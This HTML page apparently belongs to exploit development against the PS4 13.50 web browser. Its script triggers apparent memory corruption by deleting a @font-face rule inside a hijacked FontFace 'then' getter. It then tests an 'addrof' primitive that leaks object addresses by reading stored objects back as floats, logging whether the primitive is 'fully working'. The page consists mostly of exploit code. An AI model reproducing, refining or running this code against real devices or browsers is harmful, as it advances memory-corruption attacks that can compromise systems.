<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 13.50 - Address Variation Test</title>
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    
    body {
        font-family: 'Courier New', monospace;
        background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
        color: #00ff41;
        min-height: 100vh;
        padding: 20px;
    }
    
    .container {
        max-width: 1400px;
        margin: 0 auto;
    }
    
    .header {
        text-align: center;
        padding: 30px 0;
        background: rgba(0, 255, 65, 0.05);
        border: 2px solid #00ff41;
        border-radius: 15px;
        margin-bottom: 30px;
        box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
    }
    
    .header h1 {
        font-size: 2.2em;
        text-shadow: 0 0 20px rgba(0, 255, 65, 0.8);
        margin-bottom: 10px;
        letter-spacing: 3px;
    }
    
    .header .subtitle {
        font-size: 1.1em;
        color: #00cc33;
        letter-spacing: 2px;
    }
    
    .btn {
        display: block;
        margin: 0 auto 30px;
        padding: 20px 50px;
        font-size: 1.4em;
        font-weight: bold;
        border: 3px solid #00ff41;
        background: linear-gradient(135deg, rgba(0, 255, 65, 0.1) 0%, rgba(0, 255, 65, 0.2) 100%);
        color: #00ff41;
        cursor: pointer;
        border-radius: 10px;
        transition: all 0.3s ease;
        font-family: 'Courier New', monospace;
        text-transform: uppercase;
        letter-spacing: 2px;
        box-shadow: 0 5px 15px rgba(0, 255, 65, 0.3);
    }
    
    .btn:hover {
        background: linear-gradient(135deg, rgba(0, 255, 65, 0.2) 0%, rgba(0, 255, 65, 0.4) 100%);
        box-shadow: 0 8px 25px rgba(0, 255, 65, 0.5);
        transform: translateY(-3px);
    }
    
    .log-container {
        background: rgba(0, 0, 0, 0.8);
        border: 2px solid #00ff41;
        border-radius: 10px;
        padding: 20px;
        box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
    }
    
    .log-header {
        font-size: 1.2em;
        margin-bottom: 15px;
        padding-bottom: 10px;
        border-bottom: 2px solid #00ff41;
        text-transform: uppercase;
        letter-spacing: 2px;
    }
    
    #log {
        font-size: 0.9em;
        line-height: 1.6;
        max-height: 600px;
        overflow-y: auto;
        white-space: pre-wrap;
        word-wrap: break-word;
        padding: 10px;
        background: rgba(0, 0, 0, 0.5);
        border-radius: 5px;
    }
    
    #log::-webkit-scrollbar {
        width: 10px;
    }
    
    #log::-webkit-scrollbar-track {
        background: rgba(0, 255, 65, 0.1);
        border-radius: 5px;
    }
    
    #log::-webkit-scrollbar-thumb {
        background: #00ff41;
        border-radius: 5px;
    }
    
    .success { color: #00ff41; font-weight: bold; }
    .error { color: #ff3366; font-weight: bold; }
    .warning { color: #ffaa00; }
    .info { color: #00ccff; }
    .highlight { color: #ff00ff; font-weight: bold; }
</style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>◈ ADDRESS VARIATION TEST ◈</h1>
        <div class="subtitle">Testing if different objects leak different addresses</div>
    </div>
    
    <button class="btn" onclick="runTest()">► RUN TEST</button>
    
    <div class="log-container">
        <div class="log-header">◈ TEST RESULTS ◈</div>
        <div id="log"></div>
    </div>
</div>

<script>
"use strict";

let logBuf = [];

function log(msg) {
    logBuf.push(msg);
    let d = document.getElementById('log');
    if (d) {
        d.innerHTML = logBuf.map(line => {
            let className = '';
            if (line.includes('[+++]')) className = 'success';
            else if (line.includes('[ERROR]')) className = 'error';
            else if (line.includes('[!]')) className = 'warning';
            else if (line.includes('[UNIQUE]')) className = 'highlight';
            else if (line.includes('[+]')) className = 'info';
            
            return `<span class="${className}">${line}</span>`;
        }).join('\n');
        d.scrollTop = d.scrollHeight;
    }
}

function hex(n) {
    if (n < 0) n = n >>> 0;
    return '0x' + n.toString(16).padStart(8, '0');
}

class Int64 {
    constructor(low, high) {
        this.low = low >>> 0;
        this.high = high >>> 0;
    }
    
    static fromDouble(d) {
        let buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = d;
        let parts = new Uint32Array(buf);
        return new Int64(parts[0], parts[1]);
    }
    
    toString() {
        return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
    }
    
    equals(other) {
        return this.low === other.low && this.high === other.high;
    }
}

function runTest() {
    logBuf = [];
    
    log('═══════════════════════════════════════════════════════');
    log('       ADDRESS VARIATION TEST - PS4 13.50               ');
    log('═══════════════════════════════════════════════════════\n');
    
    log('[GOAL] Determine if different objects produce different addresses');
    log('[METHOD] Test multiple objects at multiple indices\n');
    
    // Setup
    let style = document.createElement('style');
    style.id = 's';
    style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
    document.head.appendChild(style);
    
    // Arrays
    let floatArray = new Float64Array(100);
    let objectArray = new Array(100);
    
    for (let i = 0; i < 100; i++) {
        floatArray[i] = 1.1 * (i + 1);
        objectArray[i] = { id: i };
    }
    
    log('[SETUP] Arrays created and pre-filled\n');
    
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;
    
    let fired = false;
    
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                
                log('[*] Inside getter - triggering corruption\n');
                
                // Create corrupted fonts
                let corrupted = [];
                for (let i = 0; i < 50; i++) {
                    corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                        unicodeRange: 'U+' + (0x100 + i).toString(16)
                    }));
                }
                
                // Trigger
                document.getElementById('s').sheet.deleteRule(0);
                document.body.offsetTop;
                
                log('[CORRUPTION] Active\n');
                
                // Required setup (Tests 1-3)
                log('[SETUP] Running required Tests 1-3...\n');
                
                try {
                    let v1 = corrupted[0];
                    let _ = v1.status;
                    
                    let v2 = corrupted[1];
                    v2.prop = { x: 1 };
                    
                    let v3 = corrupted[2];
                    floatArray[50] = v3;
                    
                    log('[SETUP] ✓ Tests 1-3 complete\n');
                } catch(e) {
                    log('[SETUP] ! Error: ' + e.message + '\n');
                }
                
                // ═══════════════════════════════════════════
                // MAIN TEST: Multiple Objects & Indices
                // ═══════════════════════════════════════════
                
                log('╔════════════════════════════════════════════════╗');
                log('║      TESTING DIFFERENT OBJECTS                 ║');
                log('╚════════════════════════════════════════════════╝\n');
                
                let testObjects = [
                    { name: "obj1", marker: 0x11111111 },
                    { name: "obj2", marker: 0x22222222 },
                    { name: "obj3", marker: 0x33333333 },
                    { name: "obj4", marker: 0x44444444 },
                    { name: "obj5", marker: 0x55555555 },
                    new ArrayBuffer(0x100),
                    new Uint32Array(16),
                    new Float64Array(16),
                    [1, 2, 3, 4, 5],
                    "string_object"
                ];
                
                let leakedAddresses = [];
                
                log('[TEST] Leaking ' + testObjects.length + ' different objects:\n');
                
                for (let i = 0; i < testObjects.length; i++) {
                    try {
                        let obj = testObjects[i];
                        let idx = 50; // Use same index to isolate object variation
                        
                        // Store object
                        objectArray[idx] = obj;
                        
                        // Read as float
                        let leaked = floatArray[idx];
                        
                        if (typeof leaked === 'number') {
                            let addr = Int64.fromDouble(leaked);
                            
                            let objStr = (typeof obj === 'object' && obj !== null && obj.name) 
                                ? obj.name 
                                : typeof obj;
                            
                            log('[' + String(i).padStart(2, '0') + '] ' + objStr.padEnd(15, ' ') + ' → ' + addr.toString());
                            
                            leakedAddresses.push(addr);
                        }
                        
                    } catch(e) {
                        log('[' + String(i).padStart(2, '0') + '] ERROR: ' + e.message);
                    }
                }
                
                log('\n');
                
                // ═══════════════════════════════════════════
                // SAME OBJECT, DIFFERENT INDICES
                // ═══════════════════════════════════════════
                
                log('╔════════════════════════════════════════════════╗');
                log('║      TESTING DIFFERENT INDICES                 ║');
                log('╚════════════════════════════════════════════════╝\n');
                
                let singleObj = { test: "same_object", marker: 0xABCDEF };
                let indicesAddresses = [];
                
                let testIndices = [40, 45, 50, 55, 60, 65, 70];
                
                log('[TEST] Same object at ' + testIndices.length + ' different indices:\n');
                
                for (let i = 0; i < testIndices.length; i++) {
                    try {
                        let idx = testIndices[i];
                        
                        objectArray[idx] = singleObj;
                        let leaked = floatArray[idx];
                        
                        if (typeof leaked === 'number') {
                            let addr = Int64.fromDouble(leaked);
                            log('[idx=' + idx + '] ' + addr.toString());
                            indicesAddresses.push(addr);
                        }
                        
                    } catch(e) {
                        log('[idx=' + testIndices[i] + '] ERROR: ' + e.message);
                    }
                }
                
                log('\n');
                
                // ═══════════════════════════════════════════
                // ANALYSIS
                // ═══════════════════════════════════════════
                
                log('╔════════════════════════════════════════════════╗');
                log('║               ANALYSIS                         ║');
                log('╚════════════════════════════════════════════════╝\n');
                
                // Check for unique addresses
                let uniqueAddrs = new Set();
                leakedAddresses.forEach(addr => {
                    uniqueAddrs.add(addr.toString());
                });
                
                log('[DIFFERENT OBJECTS TEST]');
                log('  Total leaked: ' + leakedAddresses.length);
                log('  Unique addresses: ' + uniqueAddrs.size);
                
                if (uniqueAddrs.size === 1) {
                    log('  [!] ALL SAME ADDRESS - likely tagged null/metadata');
                    log('  [!] Not leaking real object pointers');
                } else if (uniqueAddrs.size === leakedAddresses.length) {
                    log('  [+++] ALL UNIQUE - real object addresses!');
                } else {
                    log('  [+] SOME VARIATION - ' + uniqueAddrs.size + '/' + leakedAddresses.length + ' unique');
                }
                
                log('\n[DIFFERENT INDICES TEST]');
                log('  Total leaked: ' + indicesAddresses.length);
                
                let allSameIndex = indicesAddresses.length > 0 && 
                    indicesAddresses.every(addr => addr.equals(indicesAddresses[0]));
                
                if (allSameIndex) {
                    log('  [+++] ALL SAME - consistent address for same object!');
                } else {
                    log('  [!] DIFFERENT - index affects leaked value');
                }
                
                log('\n[CONCLUSION]');
                
                if (uniqueAddrs.size > 1 && allSameIndex) {
                    log('  [+++] SUCCESS! Leaking real object addresses!');
                    log('  [+++] Different objects = different addresses');
                    log('  [+++] Same object = same address (consistent)');
                    log('  [+++] addrof primitive is FULLY WORKING!');
                } else if (uniqueAddrs.size === 1) {
                    log('  [!] PROBLEM: All addresses are ' + Array.from(uniqueAddrs)[0]);
                    log('  [!] Likely leaking a constant/tag, not real addresses');
                    log('  [!] Need to decode differently or find different leak');
                } else {
                    log('  [?] MIXED RESULTS - review addresses above');
                    log('  [?] May need refinement');
                }
                
                log('\n[!] Returning - OOM will occur');
                log('═══════════════════════════════════════════════════════\n');
                
                window.leakedAddresses = leakedAddresses;
                window.indicesAddresses = indicesAddresses;
            }
            
            return undefined;
        }
    });
    
    log('[*] Starting test...\n');
    document.fonts.load('1em x', 'AB');
}

log('═══════════════════════════════════════════════════════');
log('        ADDRESS VARIATION TEST READY                   ');
log('═══════════════════════════════════════════════════════\n');
log('[INFO] This test will determine if we are leaking');
log('[INFO] real object addresses or just metadata/tags\n');
log('[READY] Click RUN TEST\n');

</script>
</body>
</html>
